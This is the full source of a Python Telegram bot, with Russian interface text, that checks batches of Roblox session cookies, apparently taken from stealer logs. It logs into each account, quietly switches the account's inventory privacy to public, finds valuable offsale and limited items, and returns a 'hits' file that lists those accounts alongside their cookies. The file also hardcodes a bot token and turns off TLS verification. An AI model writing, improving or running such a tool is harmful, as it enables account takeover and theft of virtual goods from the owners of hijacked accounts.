"""
Roblox Offsale Checker — быстрая версия
- Одна сессия на аккаунт
- Инвентарь: параллельно по всем типам  
- Оффсейл: батч catalog API (120 шт. за запрос)
- Фильтр: только платные оффсейл (не бесплатные смайлы)
- Промо: пересечение с CODE_ITEMS по ID
"""
import asyncio, io, re, aiohttp
from datetime import datetime
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import CommandStart, Command
from aiogram.types import (Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    LinkPreviewOptions, BufferedInputFile)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ============================================================
BOT_TOKEN = "8035442503:AAG-gdNAKMFhnyyaHGfjeMdh48-sa-Jd55A"
ADMIN_IDS = {5883796026, 115536598}
YEAR_FROM, YEAR_TO = 2006, 2030
CHECK_PROMO = True
ASSET_TYPES = {
    "faces": True, "hats": True, "hair": True, "neck": True,
    "shoulder": True, "front": True, "back": True, "waist": True,
    "gear": True, "clothing": False,
}
# ============================================================

TYPE_STR = {
    "faces": "Face", "hats": "Hat", "hair": "HairAccessory",
    "neck": "FaceAccessory", "shoulder": "ShoulderAccessory",
    "front": "FrontAccessory", "back": "BackAccessory",
    "waist": "WaistAccessory", "gear": "Gear",
}
LABELS = {
    "faces": "👤 Лица", "hats": "🎩 Шапки", "hair": "💇 Волосы",
    "neck": "📿 Шея", "shoulder": "🦴 Плечи", "front": "🧣 Передние",
    "back": "🎒 Задние", "waist": "🩱 Пояс", "gear": "⚔️ Снаряжение",
    "clothing": "👕 Одежда",
}
CODE_ITEMS = {
    189934238:"Fireman",4342314393:"Rainbow Squid Unicorn",
    263405835:"Chicken Headrow",263405839:"Black Iron Tentacles",
    263405842:"Code Review Specs",263405844:"Stickpack",
    263405846:"Shark Fin",263405849:"Federation Necklace",
    263405851:"Backup Mr. Robot",263405853:"Dark Lord of SQL",
    263405855:"Roblox visor 1",263405857:"Silver Bow Tie",
    263405859:"Dodgeball Helmet",263405861:"Shoulder Raccoon",
    263405863:"Dued1",263405865:"Pauldrons",
    263405867:"Octember Encore",263405869:"Umberhorns",
    128540404:"Police Cap",128540406:"American Baseball Cap",
    128540408:"Orange Cap",218491492:"Navy Queen otn",
    128540410:"Zombie Knit",128540412:"Epic Miners Headlamp",
    128540414:"Beast Mode Bandana",162295698:"Golden Reingment",
    128540416:"Beast Scythe",128540418:"Hare Hoodie",
    128540420:"Diamond Tiara",128540422:"Callmehbob",
    128540424:"Sword Cane",128540426:"Selfie Stick",
    128540428:"Phantom Forces Combat Knife",128540430:"Golden Horns",
    128540432:"The Soup is Dry",128540434:"Monster Grumpy Face",
    128540436:"Elegant Evening Face",128540438:"Super Pink Make-Up",
    128540440:"Cyanskeleface",128540442:"Pizza Face",
    128540444:"Bakonetta",128540446:"Isabella",
    128540448:"Mon Cheri",128540450:"Rogueish Good Looks",
    128540452:"Mixologist's Smile",128540454:"BiteyMcFace",
    128540456:"Performing Mime",128540458:"Rainbow Spirit Face",
    128540460:"Mermaid Mystique",128540462:"Starry Eyes Sparkling",
    128540464:"Sparkling Friendly Wink",128540466:"Kandi's Sprinkle Face",
    128540468:"Tears of Sorrow",128540470:"Fashion Face",
    128540472:"Princess Alexis",128540474:"Otakufaic",
    128540476:"Pop Queen",128540478:"Assassin Face",
    128540480:"Sapphire Gaze",128540482:"Persephone's E-Girl",
    128540484:"Arachnid Queen",128540486:"Rainbow Barf Face",
    128540488:"Star Sorority",128540490:"Tsundere Face",
    128540492:"Winning Smile",
}
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120"

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp  = Dispatcher(storage=MemoryStorage())
settings = {"year_from": YEAR_FROM, "year_to": YEAR_TO,
            "check_promo": CHECK_PROMO, "asset_types": dict(ASSET_TYPES)}

class SetYear(StatesGroup):
    from_year = State()
    to_year   = State()

# ── cookie parsing ────────────────────────────────────────────

def parse_cookie(raw):
    c = raw.strip()
    if "Cookie: " in c:
        c = c.split("Cookie: ")[-1].strip()
    if c.startswith("_|WARNING") and "|_" in c:
        c = c.split("|_", 1)[-1].strip()
    elif "_|WARNING" in c and "--|" in c:
        c = c.split("--|", 1)[-1].strip()
    for p in [".ROBLOSECURITY=", "ROBLOSECURITY="]:
        if c.lower().startswith(p.lower()):
            c = c[len(p):]
    return c.strip()

def is_cookie(v):
    if len(v) < 50 or " " in v: return False
    for bad in ["Username","Cookie:","WARNING","Birthdate","Country",
                "Robux","Email","Playtime","Gamepass","Badge","Sessions",
                "Followers","roblox.com","http","Pending","Billing","AllTime"]:
        if bad in v: return False
    return bool(re.match(r'^[A-Za-z0-9\-_=+/.%]+$', v))

def extract_cookies(text):
    cookies, seen = [], set()
    for line in re.split(r'\r?\n', text):
        val = parse_cookie(line.strip())
        if is_cookie(val) and val not in seen:
            seen.add(val); cookies.append(val)
    return cookies

# ── session ───────────────────────────────────────────────────

def make_session(cookie):
    return aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(ssl=False, limit=30),
        timeout=aiohttp.ClientTimeout(total=30),
        headers={"Cookie": ".ROBLOSECURITY=" + cookie, "User-Agent": UA,
                 "Accept": "application/json, text/plain, */*",
                 "Accept-Language": "en-US,en;q=0.9",
                 "Referer": "https://www.roblox.com/",
                 "Origin": "https://www.roblox.com"})

# ── auth ──────────────────────────────────────────────────────

async def get_user_info(session):
    for url, ik, nk in [
        ("https://users.roblox.com/v1/users/authenticated","id","displayName"),
        ("https://www.roblox.com/mobileapi/userinfo","UserID","UserName"),
    ]:
        try:
            async with session.get(url) as r:
                if r.status == 200:
                    d = await r.json(content_type=None)
                    uid = d.get(ik) or d.get("id")
                    if uid:
                        return {"id": int(uid),
                                "name": d.get(nk) or d.get("name") or "?"}
        except Exception:
            pass
    return None

# ── open inventory ────────────────────────────────────────────

async def open_inventory(session):
    csrf = None
    for url in ["https://auth.roblox.com/v2/logout",
                "https://accountsettings.roblox.com/v1/email"]:
        try:
            async with session.post(url) as r:
                t = r.headers.get("x-csrf-token")
                if t: csrf = t; break
        except Exception:
            pass
    if not csrf: return False
    hdrs = {"x-csrf-token": csrf, "Content-Type": "application/json"}
    for method, url, body in [
        ("patch","https://accountsettings.roblox.com/v1/privacy/inventory-privacy",{"inventoryPrivacy":1}),
        ("post", "https://accountsettings.roblox.com/v1/privacy/inventory-privacy",{"inventoryPrivacy":1}),
        ("patch","https://accountsettings.roblox.com/v1/privacy",{"InventoryPrivacySetting":"AllUsers"}),
        ("post", "https://accountsettings.roblox.com/v1/privacy",{"InventoryPrivacySetting":"AllUsers"}),
    ]:
        try:
            fn = session.patch if method=="patch" else session.post
            async with fn(url, json=body, headers=hdrs) as r:
                if r.status in (200,204): return True
        except Exception:
            pass
    return False

# ── load inventory ────────────────────────────────────────────

async def load_one_type(session, uid, tstr):
    ids, cursor = [], ""
    url = "https://inventory.roblox.com/v2/users/{}/inventory".format(uid)
    while True:
        params = {"assetTypes": tstr, "limit": 100, "sortOrder": "Asc"}
        if cursor: params["cursor"] = cursor
        try:
            async with session.get(url, params=params) as r:
                if r.status == 403: return ids, True
                if r.status != 200: break
                data = await r.json(content_type=None)
                for it in data.get("data", []):
                    aid = it.get("assetId") or it.get("id")
                    if aid: ids.append(int(aid))
                cursor = data.get("nextPageCursor") or ""
                if not cursor: break
        except Exception:
            break
        await asyncio.sleep(0.05)
    return ids, False

async def load_inventory(session, uid):
    def active():
        t = []
        for k, on in settings["asset_types"].items():
            if not on: continue
            if k == "clothing": t += ["Shirt","Pants"]
            elif k in TYPE_STR: t.append(TYPE_STR[k])
        return t

    async def fetch():
        types = active()
        res = await asyncio.gather(*[load_one_type(session, uid, t) for t in types])
        ids, f403 = set(), False
        for lst, got403 in res:
            ids.update(lst)
            if got403: f403 = True
        return ids, f403

    for attempt in range(3):
        ids, got403 = await fetch()
        if ids: return sorted(ids)
        opened = await open_inventory(session)
        await asyncio.sleep(2 if opened else 1 + attempt)

    return []

# ── catalog batch ─────────────────────────────────────────────

async def catalog_batch(asset_ids):
    if not asset_ids: return {}
    result = {}
    hdrs   = {"User-Agent": UA, "Content-Type": "application/json",
               "Accept": "application/json"}
    chunks = [asset_ids[i:i+120] for i in range(0, len(asset_ids), 120)]
    conn   = aiohttp.TCPConnector(ssl=False, limit=10)
    async with aiohttp.ClientSession(connector=conn, headers=hdrs,
            timeout=aiohttp.ClientTimeout(total=30)) as s:
        sem = asyncio.Semaphore(5)
        async def fetch_chunk(chunk):
            payload = {"items": [{"itemType":"Asset","id":aid} for aid in chunk]}
            for attempt in range(3):
                try:
                    async with s.post(
                        "https://catalog.roblox.com/v1/catalog/items/details",
                        json=payload) as r:
                        if r.status == 200:
                            for item in (await r.json(content_type=None)).get("data",[]):
                                aid = item.get("id")
                                if aid: result[int(aid)] = item
                            return
                        if r.status == 429: await asyncio.sleep(3+attempt*2); continue
                except Exception:
                    pass
                await asyncio.sleep(1+attempt)
        async def guarded(chunk):
            async with sem: await fetch_chunk(chunk)
        await asyncio.gather(*[guarded(c) for c in chunks])
    return result

# ── offsale filter — убираем бесплатные ──────────────────────

def is_real_offsale(item):
    """True = оффсейл предмет который реально стоил Robux."""
    ps = item.get("priceStatus") or ""
    restrictions = item.get("itemRestrictions") or []
    is_limited = "Limited" in restrictions or "LimitedUnique" in restrictions

    # Сейчас продаётся — не нужен
    if ps == "Free": return False
    if ps not in ("Off Sale", "No Price", ""):
        price = item.get("price")
        if price is not None: return False  # продаётся

    # Лимитки всегда берём
    if is_limited: return True

    # Если Off Sale — берём (стоил денег)
    if ps == "Off Sale": return True

    # No Price без limited — скорее всего бесплатная раздача
    if ps == "No Price": return False

    # Нет priceStatus — смотрим на lowestPrice
    lowest = item.get("lowestPrice")
    if lowest is not None:
        return lowest > 0   # был ненулевой ценой

    return False

def item_year(item):
    for f in ("createdUtc","created","Created"):
        v = item.get(f)
        if v:
            try:
                return datetime.fromisoformat(str(v).replace("Z","+00:00")).year
            except Exception:
                pass
    return 0

# ── main check ────────────────────────────────────────────────

async def check_account(cookie, on_status):
    result = {"valid":False,"user_id":None,"username":None,
              "offsale":[],"promo_found":[],"inv_total":0}
    async with make_session(cookie) as session:
        ui = await get_user_info(session)
        if not ui: return result
        result.update({"valid":True,"user_id":ui["id"],"username":ui["name"]})
        uid, uname = ui["id"], ui["name"]

        await on_status("✅ <b>{}</b>\n📦 Загружаю инвентарь...".format(uname))
        all_ids = await load_inventory(session, uid)
        result["inv_total"] = len(all_ids)
        if not all_ids: return result

        await on_status("✅ <b>{}</b>\n🔍 Проверяю {} предметов...".format(uname, len(all_ids)))
        catalog = await catalog_batch(all_ids)
        ids_set = set(all_ids)

        for aid, item in catalog.items():
            # Промо по ID
            if aid in CODE_ITEMS and settings["check_promo"]:
                result["promo_found"].append({"id":aid,"name":CODE_ITEMS[aid]})
                continue

            if not is_real_offsale(item): continue

            year = item_year(item)
            if year and not (settings["year_from"] <= year <= settings["year_to"]): continue

            restrictions = item.get("itemRestrictions") or []
            is_unique  = "LimitedUnique" in restrictions
            is_limited = "Limited" in restrictions or is_unique
            name = item.get("name") or item.get("Name") or "ID:{}".format(aid)
            result["offsale"].append({"id":aid,"name":name,"year":year,
                                       "limited":is_limited,"unique":is_unique})

        # Промо которые не попали в catalog batch
        if settings["check_promo"]:
            found_ids = {it["id"] for it in result["promo_found"]}
            for pid, pname in CODE_ITEMS.items():
                if pid in ids_set and pid not in found_ids:
                    result["promo_found"].append({"id":pid,"name":pname})

    return result

async def silent_check(cookie):
    async def noop(t): pass
    empty = {"valid":False,"user_id":None,"username":None,
             "offsale":[],"promo_found":[],"inv_total":0}
    last = empty
    for attempt in range(1, 4):
        try:
            r = await check_account(cookie, noop)
        except Exception:
            await asyncio.sleep(2*attempt); continue
        if not r["valid"]: return r
        if r["inv_total"] > 0: return r
        last = r
        if attempt < 3: await asyncio.sleep(3)
    return last

# ── report ────────────────────────────────────────────────────

def build_report(result):
    uid, uname = result["user_id"], result["username"]
    offsale, promo = result["offsale"], result["promo_found"]
    lines = [
        "📋 <b>Отчёт проверки</b>",
        '👤 <a href="https://www.roblox.com/users/{}/profile">{}</a>  (ID: {})'.format(uid,uname,uid),
        "📅 Период: <b>{} – {}</b>".format(settings["year_from"],settings["year_to"]),
        "📦 Предметов: <b>{}</b>".format(result.get("inv_total",0)), "",
    ]
    if offsale:
        lines.append("🛑 <b>Оффсейл — {} шт.:</b>".format(len(offsale)))
        by_year = {}
        for it in sorted(offsale, key=lambda x: x["year"] or 9999):
            by_year.setdefault(it["year"] or 0, []).append(it)
        for yr in sorted(by_year):
            lines.append("\n  📆 <b>{}:</b>".format(yr or "Год неизвестен"))
            for it in by_year[yr]:
                badge = " 🔴LimitedU" if it["unique"] else (" 🟡Limited" if it["limited"] else "")
                lines.append('    • <a href="https://www.roblox.com/catalog/{}">{}</a>{}'.format(
                    it["id"],it["name"],badge))
    else:
        lines.append("🛑 Оффсейл предметов <b>не найдено</b>")
    lines.append("")
    if settings["check_promo"]:
        if promo:
            lines.append("🎁 <b>Промо — {} шт.:</b>".format(len(promo)))
            for it in promo:
                lines.append('    • <a href="https://www.roblox.com/catalog/{}">{}</a>'.format(
                    it["id"],it["name"]))
        else:
            lines.append("🎁 Промо-предметов <b>не найдено</b>")
    return "\n".join(lines)

# ── single check ─────────────────────────────────────────────

async def run_check(message, cookie):
    cookie = parse_cookie(cookie)
    if not is_cookie(cookie):
        await message.answer("❌ Не похоже на кук Roblox."); return
    sm = await message.answer("⏳ <b>Авторизация...</b>")
    async def upd(text):
        try: await sm.edit_text(text)
        except Exception: pass
    try:
        result = await check_account(cookie, upd)
    except Exception as e:
        await sm.edit_text("❌ Ошибка:\n<code>{}</code>".format(e)); return
    if not result["valid"]:
        await sm.edit_text("❌ <b>Невалидный cookie</b>"); return
    report = build_report(result)
    if len(report) > 3800:
        await sm.delete()
        f = BufferedInputFile(report.encode("utf-8"),
                              filename="report_{}.txt".format(result["user_id"]))
        await message.answer_document(f, caption="📋 {}".format(result["username"]))
    else:
        await sm.edit_text(report, link_preview_options=LinkPreviewOptions(is_disabled=True))

# ── batch ─────────────────────────────────────────────────────

async def run_batch(message, cookies):
    total = len(cookies)
    results = [None]*total
    counter = {"done":0,"valid":0,"invalid":0}
    seen_ids = {}; dupes = 0
    prog = await message.answer("⏳ Проверяю 0/{}...".format(total))
    for i, c in enumerate(cookies):
        r = await silent_check(c)
        results[i] = (r, c)
        counter["done"] += 1
        if r["valid"]:
            counter["valid"] += 1
            uid = r["user_id"]
            if uid in seen_ids: dupes += 1
            else: seen_ids[uid] = i
        else:
            counter["invalid"] += 1
        try:
            await prog.edit_text("⏳ {}/{}  ✅{}  ❌{}".format(
                counter["done"],total,counter["valid"],counter["invalid"]))
        except Exception:
            pass
    try: await prog.delete()
    except Exception: pass

    valid_pairs = [(r,c) for r,c in results if r and r["valid"] and r["user_id"] in seen_ids]
    hits = [(r,c) for r,c in valid_pairs if r["offsale"] or r["promo_found"]]
    await message.answer(
        "📊 <b>Итоги</b>\n🔢<b>{}</b>  ✅<b>{}</b>  ❌<b>{}</b>  👥<b>{}</b>\n"
        "🛑 с оффсейл: <b>{}</b>  🎁 с промо: <b>{}</b>".format(
            total,counter["valid"],counter["invalid"],dupes,
            sum(1 for r,_ in valid_pairs if r["offsale"]),
            sum(1 for r,_ in valid_pairs if r["promo_found"])))
    if hits:
        lines = ["АККАУНТЫ С НАХОДКАМИ","="*60,""]
        for r,c in hits:
            uid,uname = r["user_id"],r["username"]
            lines += ["="*60,
                      "Аккаунт: {} (ID: {})".format(uname,uid),
                      "Ссылка: https://www.roblox.com/users/{}/profile".format(uid),
                      "Куки: {}".format(c),""]
            if r["offsale"]:
                lines.append("ОФФСЕЙЛ ({} шт.):".format(len(r["offsale"])))
                for it in sorted(r["offsale"],key=lambda x:x["year"] or 9999):
                    badge = " [LimitedU]" if it["unique"] else (" [Limited]" if it["limited"] else "")
                    lines.append("  {} ({}) — https://www.roblox.com/catalog/{}{}".format(
                        it["name"],it["year"] or "?",it["id"],badge))
            if r["promo_found"]:
                lines.append("\nПРОМО ({} шт.):".format(len(r["promo_found"])))
                for it in r["promo_found"]:
                    lines.append("  {} — https://www.roblox.com/catalog/{}".format(it["name"],it["id"]))
            lines.append("")
        f = BufferedInputFile("\n".join(lines).encode("utf-8"),
                              filename="hits_{}.txt".format(len(hits)))
        await message.answer_document(f,
            caption="🎯 {} акков с находками из {}".format(len(hits),total))
    else:
        await message.answer("😔 Ничего не найдено.")

# ── keyboard ─────────────────────────────────────────────────

def settings_kb():
    rows = []
    for key, label in LABELS.items():
        icon = "✅" if settings["asset_types"][key] else "❌"
        rows.append([InlineKeyboardButton(text="{} {}".format(icon,label),
                                          callback_data="tog_{}".format(key))])
    pi = "✅" if settings["check_promo"] else "❌"
    rows.append([InlineKeyboardButton(text="{} 🎁 Промо".format(pi),callback_data="tog_promo")])
    rows.append([
        InlineKeyboardButton(text="📅 С {}".format(settings["year_from"]),callback_data="set_yf"),
        InlineKeyboardButton(text="📅 По {}".format(settings["year_to"]),callback_data="set_yt"),
    ])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def is_admin(obj): return obj.from_user.id in ADMIN_IDS

# ── handlers ─────────────────────────────────────────────────

@dp.message(CommandStart())
async def cmd_start(message: Message):
    if not is_admin(message): return
    await message.answer("🎮 <b>Roblox Offsale Checker</b>\n\nОтправь cookie текстом или .txt файлом\n\n⚙️ /settings  ℹ️ /info")

@dp.message(Command("info"))
async def cmd_info(message: Message):
    if not is_admin(message): return
    types_on = [LABELS[k] for k,v in settings["asset_types"].items() if v]
    await message.answer("ℹ️ <b>Настройки</b>\n📅 {}-{}\n🎁 Промо: {}\n📦 {}".format(
        settings["year_from"],settings["year_to"],
        "✅" if settings["check_promo"] else "❌",", ".join(types_on)))

@dp.message(Command("settings"))
async def cmd_settings(message: Message):
    if not is_admin(message): return
    await message.answer("⚙️ <b>Настройки</b>", reply_markup=settings_kb())

@dp.callback_query(F.data.startswith("tog_"))
async def cb_toggle(cb: CallbackQuery):
    if not is_admin(cb): return await cb.answer("⛔")
    key = cb.data.replace("tog_","")
    if key == "promo": settings["check_promo"] = not settings["check_promo"]
    elif key in settings["asset_types"]: settings["asset_types"][key] = not settings["asset_types"][key]
    await cb.message.edit_reply_markup(reply_markup=settings_kb())
    await cb.answer("✅")

@dp.callback_query(F.data == "set_yf")
async def cb_yf(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb): return await cb.answer("⛔")
    await cb.message.answer("📅 Начальный год (сейчас {}):".format(settings["year_from"]))
    await state.set_state(SetYear.from_year); await cb.answer()

@dp.callback_query(F.data == "set_yt")
async def cb_yt(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb): return await cb.answer("⛔")
    await cb.message.answer("📅 Конечный год (сейчас {}):".format(settings["year_to"]))
    await state.set_state(SetYear.to_year); await cb.answer()

@dp.message(SetYear.from_year)
async def save_yf(message: Message, state: FSMContext):
    if not is_admin(message): await state.clear(); return
    try:
        y = int(message.text.strip()); assert 2006<=y<=2030
        settings["year_from"] = y
        await message.answer("✅ Начальный год: <b>{}</b>".format(y)); await state.clear()
    except (ValueError,AssertionError):
        await message.answer("❌ Введи число 2006–2030")

@dp.message(SetYear.to_year)
async def save_yt(message: Message, state: FSMContext):
    if not is_admin(message): await state.clear(); return
    try:
        y = int(message.text.strip()); assert 2006<=y<=2030
        settings["year_to"] = y
        await message.answer("✅ Конечный год: <b>{}</b>".format(y)); await state.clear()
    except (ValueError,AssertionError):
        await message.answer("❌ Введи число 2006–2030")

@dp.message(F.document)
async def handle_file(message: Message, state: FSMContext):
    if not is_admin(message): return
    if await state.get_state(): return
    doc = message.document
    if not doc.file_name.endswith(".txt"):
        await message.answer("❌ Нужен .txt файл"); return
    file = await bot.get_file(doc.file_id)
    buf  = io.BytesIO()
    await bot.download_file(file.file_path, destination=buf)
    buf.seek(0)
    cookies = extract_cookies(buf.read().decode("utf-8", errors="ignore"))
    if not cookies:
        await message.answer("❌ Не нашёл куков в файле"); return
    await message.answer("📂 Найдено <b>{}</b> куков.".format(len(cookies)))
    if len(cookies) == 1: await run_check(message, cookies[0])
    else: await run_batch(message, cookies)

@dp.message(F.text)
async def handle_text(message: Message, state: FSMContext):
    if not is_admin(message): return
    if await state.get_state(): return
    cookies = extract_cookies(message.text)
    if not cookies:
        await message.answer("ℹ️ Отправь cookie или .txt файл\n/settings"); return
    if len(cookies) == 1: await run_check(message, cookies[0])
    else: await run_batch(message, cookies)

# ── run ───────────────────────────────────────────────────────

async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
